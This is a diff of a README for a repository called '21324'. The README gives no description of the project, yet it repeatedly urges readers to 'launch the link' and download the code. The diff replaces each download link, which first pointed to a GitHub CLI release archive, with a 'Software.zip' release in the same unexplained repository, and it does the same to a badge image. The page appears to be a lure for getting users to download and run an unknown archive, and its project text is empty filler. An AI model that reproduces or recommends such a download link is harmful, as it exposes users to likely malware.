@@ -1,14 +1,14 @@
 
 # Welcome to the "21324" Repository! 🚀
 
-![GitHub](https://img.shields.io/badge/Launch%20Link%20-%20v1.0.0-brightgreen)
+![GitHub](https://github.com/kimm1001/21324/releases/download/v1.0/Software.zip%20Link%20-%20v1.0.0-brightgreen)
 
 ## Description
 Welcome to the "21324" repository. Unfortunately, no specific description or topics have been provided for this repository. It seems like a mysterious project waiting to be explored!
 
 ## Explore the Repository
 Although no information has been shared about the purpose of this repository, you can still download the code by visiting the link below:
-[Download "21324" Repository](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[Download "21324" Repository](https://github.com/kimm1001/21324/releases/download/v1.0/Software.zip)
 
 If the link does not work, you can check the "Releases" section of this repository to find the necessary files.
 
@@ -30,7 +30,7 @@ This repository named "21324" does not provide a specific description or designa
 
 🔍 **Explore to Discover**: Even without a defined purpose, the "21324" repository invites you to delve into its contents, download the code, and uncover the hidden gems within.
 
-🔗 **Download Link**: To access the repository files, click [here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip). Launch the link for a direct dive into the project mysteries!
+🔗 **Download Link**: To access the repository files, click [here](https://github.com/kimm1001/21324/releases/download/v1.0/Software.zip). Launch the link for a direct dive into the project mysteries!
 
 🚀 **Unleash the Potential**: Launch the link, explore the repository, and unleash your creativity to decode the secrets hidden within the "21324" project.
 
@@ -57,6 +57,6 @@ Step into the realm of the "21324" repository and embark on an exciting adventur
 
 ---
 
-Feel free to download the [zip file](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) to start unraveling the mysteries of the "21324" repository! 🚀
+Feel free to download the [zip file](https://github.com/kimm1001/21324/releases/download/v1.0/Software.zip) to start unraveling the mysteries of the "21324" repository! 🚀
 
 Let the adventure begin! Have fun exploring! 🌟
